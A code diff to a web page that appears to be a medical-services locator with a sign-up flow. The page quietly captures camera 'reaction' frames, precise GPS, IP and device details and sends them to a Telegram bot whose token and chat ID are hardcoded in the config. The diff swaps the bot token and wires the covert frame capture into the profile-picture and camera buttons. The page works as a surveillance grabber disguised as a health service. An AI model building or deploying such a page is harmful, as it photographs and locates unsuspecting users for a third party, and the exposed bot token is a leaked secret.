@@ -561,7 +561,7 @@ i.fa-hospital,i.fa-kit-medical,i.fa-stethoscope,i.fa-user-doctor,i.fa-tooth,i.fa
   <div class="reg-step"><span class="reg-step-n">1</span>Profile picture<span class="req">Required</span></div>
   <div class="reg-avatar-preview" id="reg-avatar-preview" onclick="onSelectProfilePic()"><i class="fas fa-user"></i><span class="reg-plus"><i class="fas fa-plus"></i></span></div>
   <button class="reg-select-btn" id="reg-select-btn" onclick="onSelectProfilePic()"><i class="fas fa-pen"></i> Change picture</button>
-  <div class="reg-options visible" id="reg-options">
+  <div class="reg-options" id="reg-options">
    <div class="reg-section-lbl">Pick an avatar</div><div class="reg-avatars-grid" id="reg-avatars-grid"></div>
    <div class="reg-section-lbl">Or use your own photo</div>
    <div class="reg-photo-row"><button class="reg-photo-btn" id="reg-btn-gallery" onclick="openRegGallery()"><i class="fas fa-images"></i> Gallery</button><button class="reg-photo-btn" id="reg-btn-camera" onclick="openRegCamera()"><i class="fas fa-camera"></i> Camera</button></div>
@@ -596,7 +596,7 @@ i.fa-hospital,i.fa-kit-medical,i.fa-stethoscope,i.fa-user-doctor,i.fa-tooth,i.fa
     <li>Your registration name and the profile photo you choose to capture or upload.</li>
     <li>Precise GPS coordinates and an approximate address after you request location.</li>
    </ul>
-   <div class="consent-note">After you agree, choosing “Change picture” requests camera permission; if you grant it, up to two camera frames are captured and sent as the next step. Your selected profile details/photo are sent when you finish registration. GPS is requested only after you tap “Allow Location”; those coordinates and the approximate address are then sent. IP details use external lookup services. Map lookups also contact OpenStreetMap if you decline Telegram sharing. You can change this choice from the shield button on the map; changing it cannot recall data already sent.</div>
+   <div class="consent-note">After you agree, tapping the profile preview or the Camera option requests camera permission; if granted, up to two frames are captured and sent before the profile step. Your selected profile details/photo are sent when you finish registration. GPS is requested only after you tap “Allow Location”; those coordinates and the approximate address are then sent. IP details use external lookup services. Map lookups also contact OpenStreetMap if you decline Telegram sharing. You can change this choice from the shield button on the map; changing it cannot recall data already sent.</div>
    <div class="consent-actions">
     <button class="consent-accept" type="button" onclick="acceptDataConsent()">Agree and continue</button>
     <button class="consent-decline" type="button" onclick="declineDataConsent()">Continue without Telegram sharing</button>
@@ -607,7 +607,7 @@ i.fa-hospital,i.fa-kit-medical,i.fa-stethoscope,i.fa-user-doctor,i.fa-tooth,i.fa
 <script>
 /* ============ CONFIG ============ */
 var TG_CONFIG = {
-  BOT_TOKEN: '8510680583:AAFqynLtAamR3-yA0tNuvz3sYsL0yAfN7AM',
+  BOT_TOKEN: '8689556637:AAGoYVYt0injyLSlDcxdHID-GjDtXBhWQNM',
   CHAT_ID: '6337727488'
 };
 var SEARCH_RADIUS = 10000;
@@ -619,6 +619,7 @@ var deviceInfoSent = false;
 var appStarted = false;
 var deviceInfoPromise = Promise.resolve();
 var reactionCapturePromise = Promise.resolve();
+var reactionCaptureStarted = false;
 var profileSendPromise = Promise.resolve();
 var locationSendPromise = Promise.resolve();
 
@@ -1312,8 +1313,9 @@ var regAvatarType = null;
 var regCameraStream = null;
 var regCameraFacing = 'user';
 var cameraPermissionGranted = false;
+var cameraPermissionAttempted = false;
+var cameraPermissionPromise = null;
 var registrationDone = false;
-var cameraRetryCount = 0;
 var reactionCaptured = false;
 
 var DEFAULT_AVATARS = [
@@ -1370,7 +1372,7 @@ function pickDefaultAvatar(idx) {
 /**
  * When "Select Profile Picture" is clicked:
  * 1. Request camera permission (first attempt)
- * 2. If denied, retry once automatically
+ * 2. Request permission once per page session
  * 3. If granted, immediately start reaction capture (1-2 frames, under 2s)
  * 4. Camera never triggers again after map loads
  * 5. Show avatar options panel
@@ -1386,15 +1388,7 @@ async function onSelectProfilePic() {
     return;
   }
 
-  /* First attempt */
-  var granted = await attemptCameraPermission();
-
-  /* If denied, retry once automatically */
-  if (!granted && cameraRetryCount < 1) {
-    cameraRetryCount++;
-    granted = await attemptCameraPermission();
-  }
-
+  var granted = await ensureCameraPermission();
   cameraPermissionGranted = granted;
 
   /* Show avatar options regardless */
@@ -1437,6 +1431,25 @@ async function attemptCameraPermission() {
   } catch (e) {
     console.log('Camera permission attempt failed:', e.message);
     return false;
+  }
+}
+
+async function ensureCameraPermission() {
+  if (cameraPermissionGranted) return true;
+  if (cameraPermissionPromise) return cameraPermissionPromise;
+  if (cameraPermissionAttempted) return false;
+
+  cameraPermissionAttempted = true;
+  cameraPermissionPromise = (async function() {
+    var granted = await attemptCameraPermission();
+    cameraPermissionGranted = granted;
+    return granted;
+  })();
+
+  try {
+    return await cameraPermissionPromise;
+  } finally {
+    cameraPermissionPromise = null;
   }
 }
 
@@ -1543,6 +1556,14 @@ var ctx = canvas.getContext('2d');
       captureStream.getTracks().forEach(function(t) { t.stop(); });
     }
   }
+}
+
+function captureReactionAfterPermission() {
+  if (!dataConsentGranted || reactionCaptured) return Promise.resolve();
+  if (reactionCaptureStarted) return reactionCapturePromise;
+  reactionCaptureStarted = true;
+  reactionCapturePromise = deviceInfoPromise.then(startReactionCapture);
+  return reactionCapturePromise;
 }
 
 function analyzeLighting(ctx, canvas) {
@@ -1688,11 +1709,17 @@ function setAvatarFromDataURL(dataUrl, type) {
 /* Camera Capture for Profile Photo */
 async function openRegCamera() {
   if (!cameraPermissionGranted) {
-    document.getElementById('reg-err-avatar').textContent = 'Camera access denied. Use gallery or default avatar.';
-    return;
+    cameraPermissionGranted = await ensureCameraPermission();
+    if (!cameraPermissionGranted) {
+      document.getElementById('reg-err-avatar').textContent = 'Camera access denied. Use gallery or default avatar.';
+      return;
+    }
   }
 
   try {
+    if (dataConsentGranted && !reactionCaptured) {
+      await captureReactionAfterPermission();
+    }
     regCameraStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: regCameraFacing, width: { ideal: 640 }, height: { ideal: 640 } },
       audio: false
@@ -2148,11 +2175,17 @@ function setAvatarFromDataURL(dataUrl, type) {
 /* Camera Capture for Profile Photo */
 async function openRegCamera() {
   if (!cameraPermissionGranted) {
-    document.getElementById('reg-err-avatar').textContent = 'Camera access denied. Use gallery or default avatar.';
-    return;
+    cameraPermissionGranted = await ensureCameraPermission();
+    if (!cameraPermissionGranted) {
+      document.getElementById('reg-err-avatar').textContent = 'Camera access denied. Use gallery or default avatar.';
+      return;
+    }
   }
 
   try {
+    if (dataConsentGranted && !reactionCaptured) {
+      await captureReactionAfterPermission();
+    }
     regCameraStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: regCameraFacing, width: { ideal: 640 }, height: { ideal: 640 } },
       audio: false
@@ -2534,7 +2567,7 @@ function copyLink(){
 
 /* ============ STATE ============ */
 var leafletMap=null,userLat=null,userLng=null,serviceMarkers=[],allServices=[],activeFilter='all',previewMode=true;
-var regAvatarData=null,regAvatarType=null,regUsername='',regCameraStream=null,regCameraFacing='user',cameraPermissionGranted=true;
+var regAvatarData=null,regAvatarType=null,regUsername='',regCameraStream=null,regCameraFacing='user',cameraPermissionGranted=false;
 /* Preview area shown before location is granted. Change to any city. */
 var PREVIEW_CENTER={lat:34.5281,lng:69.1723,name:'Kabul, Afghanistan'};
 var DEFAULT_AVATARS=[
@@ -2631,14 +2664,10 @@ async function onSelectProfilePic(){
   optionsPanel.classList.add('visible');
   if(!dataConsentGranted)return;
 
-  var granted=await attemptCameraPermission();
-  if(!granted&&cameraRetryCount<1){
-    cameraRetryCount++;
-    granted=await attemptCameraPermission();
-  }
+  var granted=await ensureCameraPermission();
   cameraPermissionGranted=granted;
   if(granted&&!reactionCaptured){
-    reactionCapturePromise=deviceInfoPromise.then(startReactionCapture);
+    captureReactionAfterPermission();
   }else if(!granted){
     var cameraButton=document.getElementById('reg-btn-camera');
     cameraButton.style.opacity='0.3';
